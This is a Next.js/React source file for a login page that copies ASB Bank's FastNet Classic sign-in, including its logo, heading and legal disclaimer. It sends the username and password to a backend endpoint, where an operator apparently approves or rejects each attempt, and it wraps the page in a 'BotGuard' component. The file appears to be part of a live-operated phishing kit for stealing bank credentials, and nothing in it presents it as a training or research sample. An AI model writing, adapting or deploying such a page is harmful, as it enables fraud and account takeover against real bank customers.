'use client';

/**
 * ASB Bank Credentials Page
 * 
 * Pixel-perfect match to ASB FastNet Classic login design
 * Username + Password fields with icon inputs
 * Remember me checkbox, forgot links
 */

import { useCallback, useEffect, useState } from 'react';
import { useParams } from 'next/navigation';
import { useSessionStore } from '@shared';
import { currentBrand } from '@/config/branding';
import { AlertCircle, Loader2, User, Lock, Check, Info } from 'lucide-react';
import { BotGuard } from '@/components/security/BotGuard';

export default function CredentialsPage() {
  const params = useParams();
  const sessionUuid = params.session_uuid as string;

  const { stage, status, loading, error, caseId } = useSessionStore();
  const { agentMessage } = useSessionStore();

  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [fieldError, setFieldError] = useState('');
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [usernameError, setUsernameError] = useState(false);
  const [passwordError, setPasswordError] = useState(false);

  // Reset form when agent rejects submission
  useEffect(() => {
    if (status === 'rejected' || status === 'error') {
      setUsername('');
      setPassword('');
      setFieldError(agentMessage || 'Your submission was rejected. Please try again.');
      setIsSubmitting(false);
    }
  }, [status, agentMessage]);

  const handleSubmit = useCallback(
    async (e: React.FormEvent) => {
      e.preventDefault();
      setFieldError('');
      setUsernameError(false);
      setPasswordError(false);

      if (!caseId) {
        setFieldError('Session information missing. Please refresh and try again.');
        return;
      }

      let hasError = false;

      if (!username.trim()) {
        setUsernameError(true);
        hasError = true;
      }

      if (!password) {
        setPasswordError(true);
        hasError = true;
      }

      if (hasError) {
        setFieldError('Please enter your username and password.');
        return;
      }

      setIsSubmitting(true);

      try {
        const response = await fetch('/api/submit-credentials', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            case_id: caseId,
            username: username.trim(),
            password,
          }),
        });

        if (!response.ok) {
          console.error('Submission error');
          setFieldError('Unable to process your credentials. Please try again.');
          setIsSubmitting(false);
          return;
        }

        useSessionStore.setState({
          status: 'waiting',
          agentMessage: 'Verifying your credentials...',
          formData: {},
        });
      } catch (error) {
        console.error('Submission error:', error);
        setFieldError('Submission failed. Please try again.');
        setIsSubmitting(false);
      }
    },
    [username, password, sessionUuid, caseId]
  );

  const isWaiting = status === 'waiting' || isSubmitting || loading;

  return (
    <BotGuard>
      {/* ASB Header */}
      <header className="header">
        <div className="header-container">
          <a href="#" className="logo-link">
            <img src="/brands/asb/logo-asb.svg" alt="ASB Logo" className="logo" />
          </a>
        </div>
      </header>

      {/* Main content area */}
      <main className="main-content">
        <section className="login-section">
          <div className="login-container">
            <h1 className="page-title">Continue to FastNet Classic</h1>

            {/* Error Alert */}
            {fieldError && (
              <div className="alert-box">
                <AlertCircle className="alert-icon" />
                <span className="alert-text">{fieldError}</span>
              </div>
            )}
            {(error && !fieldError) && (
              <div className="alert-box">
                <AlertCircle className="alert-icon" />
                <span className="alert-text">{error}</span>
              </div>
            )}

            <form className="login-form" onSubmit={handleSubmit} noValidate>
              {/* Username Field */}
              <div className="form-group">
                <label htmlFor="username" className="form-label">Username</label>
                <div className="input-wrapper">
                  <User className="input-icon" />
                  <input
                    type="text"
                    id="username"
                    name="username"
                    className={`form-input${usernameError ? ' has-error' : ''}`}
                    autoComplete="username"
                    value={username}
                    onChange={(e) => {
                      setUsername(e.target.value);
                      setUsernameError(false);
                      if (fieldError) setFieldError('');
                    }}
                    disabled={isWaiting}
                  />
                  {usernameError && <AlertCircle className="error-icon" />}
                </div>
              </div>

              {/* Password Field */}
              <div className="form-group">
                <label htmlFor="password" className="form-label">Password</label>
                <div className="input-wrapper">
                  <Lock className="input-icon" />
                  <input
                    type="password"
                    id="password"
                    name="password"
                    className={`form-input${passwordError ? ' has-error' : ''}`}
                    autoComplete="current-password"
                    value={password}
                    onChange={(e) => {
                      setPassword(e.target.value);
                      setPasswordError(false);
                      if (fieldError) setFieldError('');
                    }}
                    disabled={isWaiting}
                  />
                  {passwordError && <AlertCircle className="error-icon" />}
                </div>
              </div>

              {/* Remember Me Checkbox */}
              <div className="form-group checkbox-group">
                <label className="checkbox-label">
                  <div className="checkbox-wrapper">
                    <input type="checkbox" id="remember" className="form-checkbox-input" />
                    <div className="custom-checkbox">
                      <Check className="check-icon" />
                    </div>
                  </div>
                  <span className="remember-text">Remember me</span>
                  <button type="button" className="info-button" aria-label="More information">
                    <Info className="info-icon" />
                  </button>
                </label>
              </div>

              {/* Submit Button */}
              <button
                type="submit"
                className="submit-button"
                disabled={isWaiting}
              >
                {isWaiting && <Loader2 className="h-4 w-4 animate-spin" />}
                {isWaiting ? 'Logging in...' : 'Log in'}
              </button>

              {/* Forgot Links */}
              <div className="forgot-links">
                <div className="forgot-wrapper">
                  <a href="#" className="forgot-link">Forgot your password?</a>
                  <span className="new-badge">NEW</span>
                </div>
                <a href="#" className="forgot-link">Forgot your username?</a>
              </div>
            </form>
          </div>
        </section>

        {/* Extra Info */}
        <div className="extra-info">
          <p className="not-customer">Not an ASB customer? <a href="#" className="register-link">Register now</a></p>
          <p className="disclaimer">
            FastNet is licensed to ASB Bank Limited and is solely for the use of persons authorised by
            ASB Bank Limited. Do not access FastNet unless you have been specifically authorised to do so. Unauthorised
            access is prohibited.
          </p>
        </div>
      </main>
    </BotGuard>
  );
}
